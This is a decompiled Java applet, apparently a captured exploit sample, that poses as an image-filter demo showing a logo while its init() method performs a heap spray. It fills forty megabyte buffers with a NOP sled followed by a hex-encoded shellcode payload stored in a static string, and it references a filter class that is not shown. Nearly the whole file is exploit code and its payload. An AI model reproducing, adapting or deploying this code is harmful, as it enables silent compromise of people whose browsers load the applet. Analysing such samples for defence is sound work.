import java.awt.image.ImageObserver;
import java.awt.Graphics;
import java.awt.image.ImageProducer;
import java.awt.image.ImageFilter;
import java.awt.image.FilteredImageSource;
import java.awt.Component;
import java.awt.MediaTracker;
import java.awt.Image;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class vmain extends Applet
{
    private IntBuffer[] mem;
    private Image src;
    private Image dst;
    private boolean painted;
    static String scc;
    
    public vmain() {
        this.painted = false;
    }
    
    public void init() {
        this.src = this.getImage(this.getCodeBase(), "logo.png");
        final MediaTracker mediaTracker = new MediaTracker(this);
        mediaTracker.addImage(this.src, 0);
        try {
            mediaTracker.waitForAll();
        }
        catch (InterruptedException ex) {}
        mediaTracker.removeImage(this.src);
        this.dst = this.createImage(new FilteredImageSource(this.src.getSource(), new vsub()));
        try {
            this.mem = this.mspray(HexDecode(vmain.scc), HexDecode("90909090"));
        }
        catch (Exception ex2) {}
    }
    
    public void paint(final Graphics graphics) {
        if (!this.painted) {
            this.painted = true;
            if (this.src != null) {
                graphics.drawImage(this.src, 10, 10, this);
            }
            if (this.dst != null) {
                graphics.drawImage(this.dst, 250, 10, this);
            }
        }
    }
    
    public static byte[] HB(final String s) {
        final byte[] array = new byte[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (byte)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return array;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] mspray(final short[] array, final short[] array2) {
        final int n = 40;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
    
    static {
        vmain.scc = "d9c7d97424f4b8934f499529c95ab13931421983eafc03421571bab57dfc45467e9ecca34f8caba0e200bfe50eebed1d849939112d171c1cae96a0f26cb95c09a1195cc2b458993f3608724be5bcf70936bdd70506c552d9f37f5c0aabf416b2c75287c30481fb8a21718f0ce048703fcc064f8fc15797283a22e34ac734303013b1a592d0610e2234f7c528f17c812c0451b9498d546ed8d572aa808e1beb6c6024ebc9dd8067fb0ab22596cd3750dfce475b70a776d01fb08733644ec21ecdc78aca4f8a2d2193b3adc06c40ada0690c6a58001d1e5eb71e0b334489c7ad8a21535abb8bb48d489eabffc733537236a2c606695967835aee053ecb10b186c9";
    }
}
